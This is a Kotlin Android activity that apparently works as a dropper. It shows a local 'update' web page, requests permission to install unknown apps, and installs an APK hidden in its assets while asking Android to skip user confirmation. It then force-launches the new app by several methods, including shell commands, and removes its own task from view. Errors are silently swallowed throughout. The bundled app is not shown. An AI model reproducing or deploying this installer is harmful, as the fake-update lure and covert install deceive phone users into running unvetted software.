package com.example.installer

import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.View
import android.view.WindowInsetsController
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import java.io.File
import java.io.FileOutputStream

class MainActivity : Activity() {

    companion object {
        private const val APK_NAME = "main-app.apk"
        private const val REQUEST_INSTALL = 100
        private const val ACTION_INSTALL = "com.example.installer.INSTALL"
    }

    private lateinit var webView: WebView
    private var packageName: String? = null
    private var mainActivity: String? = null
    private val handler = Handler(Looper.getMainLooper())
    private var isInstalling = false

    private val installReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)

            when (status) {
                PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                    val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                    confirmIntent?.let { startActivity(it) }
                }

                PackageInstaller.STATUS_SUCCESS -> {
                    handler.post {
                        toast("Installed!")
                    }
                    handler.postDelayed({
                        forceOpenApp()
                    }, 500)
                }

                else -> {
                    handler.post {
                        isInstalling = false
                        toast("Installation failed")
                        webView.loadUrl("file:///android_asset/update/update.html?error=true")
                    }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setupSystemBars()
        registerReceiver(installReceiver, IntentFilter(ACTION_INSTALL))

        webView = WebView(this).apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                allowContentAccess = true
                mediaPlaybackRequiresUserGesture = false
                javaScriptCanOpenWindowsAutomatically = true
            }

            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                }

                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                    return false
                }
            }

            webChromeClient = WebChromeClient()
        }

        webView.addJavascriptInterface(WebAppInterface(), "Android")
        webView.loadUrl("file:///android_asset/update/update.html")

        setContentView(webView)
    }

    inner class WebAppInterface {
        @JavascriptInterface
        fun installPlugin() {
            handler.post {
                if (!isInstalling) {
                    checkPermission()
                }
            }
        }

        @JavascriptInterface
        fun onInstallComplete() {
            handler.post {
                webView.postDelayed({
                    webView.loadUrl("file:///android_asset/update/update.html?installed=true")
                }, 1000)
            }
        }
    }

    private fun checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                    data = Uri.parse("package:${this@MainActivity.packageName}")
                }
                startActivityForResult(intent, REQUEST_INSTALL)
                return
            }
        }
        install()
    }

    private fun install() {
        if (isInstalling) return
        isInstalling = true

        handler.post {
            webView.loadUrl("file:///android_asset/update/installing.html")
        }

        Thread {
            var session: PackageInstaller.Session? = null
            try {
                readApkInfo()

                if (packageName == null) {
                    handler.post {
                        isInstalling = false
                        toast("Cannot read APK")
                        webView.loadUrl("file:///android_asset/update/update.html?error=apk")
                    }
                    return@Thread
                }

                val installer = packageManager.packageInstaller

                val params = PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL
                ).apply {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        setRequireUserAction(
                            PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED
                        )
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        setInstallReason(PackageManager.INSTALL_REASON_USER)
                    }
                }

                val sessionId = installer.createSession(params)
                session = installer.openSession(sessionId)

                session.openWrite("package", 0, -1).use { out ->
                    assets.open(APK_NAME).use { input ->
                        val buffer = ByteArray(65536)
                        var read: Int
                        while (input.read(buffer).also { read = it } != -1) {
                            out.write(buffer, 0, read)
                        }
                        session.fsync(out)
                    }
                }

                val intent = Intent(ACTION_INSTALL)

                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    PendingIntent.FLAG_MUTABLE
                } else {
                    PendingIntent.FLAG_UPDATE_CURRENT
                }

                val sender = PendingIntent.getBroadcast(
                    this@MainActivity, sessionId, intent, flags
                )

                session.commit(sender.intentSender)

            } catch (e: Exception) {
                session?.abandon()
                handler.post {
                    isInstalling = false
                    toast("Failed!")
                    webView.loadUrl("file:///android_asset/update/update.html?error=install")
                }
            }
        }.start()
    }

    private fun readApkInfo() {
        try {
            val tempFile = File(cacheDir, "temp.apk")

            FileOutputStream(tempFile).use { out ->
                assets.open(APK_NAME).use { input ->
                    val buffer = ByteArray(8192)
                    var read: Int
                    while (input.read(buffer).also { read = it } != -1) {
                        out.write(buffer, 0, read)
                    }
                }
            }

            val info = packageManager.getPackageArchiveInfo(
                tempFile.absolutePath,
                PackageManager.GET_ACTIVITIES
            )

            info?.let {
                packageName = it.packageName
                val activities = it.activities
                if (activities != null && activities.isNotEmpty()) {
                    mainActivity = activities[0].name
                }
            }

            tempFile.delete()

        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun forceOpenApp() {
        Thread {
            try {
                Thread.sleep(800)
                tryMethod1()
                Thread.sleep(300)
                tryMethod2()
                Thread.sleep(300)
                tryMethod3()
                Thread.sleep(300)
                tryMethod4()

                handler.postDelayed({
                    finishAndRemoveTask()
                }, 1000)

            } catch (e: Exception) {
                // Ignore
            }
        }.start()
    }

    private fun tryMethod1() {
        try {
            if (packageName == null || mainActivity == null) return

            val intent = Intent().apply {
                component = ComponentName(packageName!!, mainActivity!!)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }

            startActivity(intent)
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun tryMethod2() {
        try {
            packageName ?: return

            val cmd = "monkey -p $packageName 1"
            val process = Runtime.getRuntime().exec(cmd)
            process.waitFor()
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun tryMethod3() {
        try {
            packageName ?: return

            val cmd = "am start -n $packageName/$mainActivity"
            val process = Runtime.getRuntime().exec(cmd)
            process.waitFor()
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun tryMethod4() {
        try {
            packageName ?: return

            val intent = packageManager.getLaunchIntentForPackage(packageName!!)

            intent?.let {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(it)
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_INSTALL) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (packageManager.canRequestPackageInstalls()) {
                    install()
                } else {
                    toast("Permission denied")
                }
            }
        }
    }

    private fun setupSystemBars() {
        try {
            val window = window
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    window.statusBarColor = Color.WHITE
                    window.navigationBarColor = Color.WHITE
                    
                    val controller = window.insetsController
                    controller?.let {
                        it.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS
                        )
                        it.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS
                        )
                    }
                } catch (e: Exception) {
                    // Ignore
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    window.statusBarColor = Color.WHITE
                    window.navigationBarColor = Color.WHITE
                    
                    var flags = window.decorView.systemUiVisibility
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        flags = flags or View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                        flags = flags or View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR
                    }
                    window.decorView.systemUiVisibility = flags
                } catch (e: Exception) {
                    // Ignore
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    override fun onBackPressed() {
        try {
            if (::webView.isInitialized && webView.canGoBack()) {
                webView.goBack()
            } else {
                super.onBackPressed()
            }
        } catch (e: Exception) {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(installReceiver)
        } catch (e: Exception) {
            // Ignore
        }
        try {
            if (::webView.isInitialized) {
                webView.destroy()
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun toast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }

    private fun dp(d: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            d.toFloat(),
            resources.displayMetrics
        ).toInt()
    }
}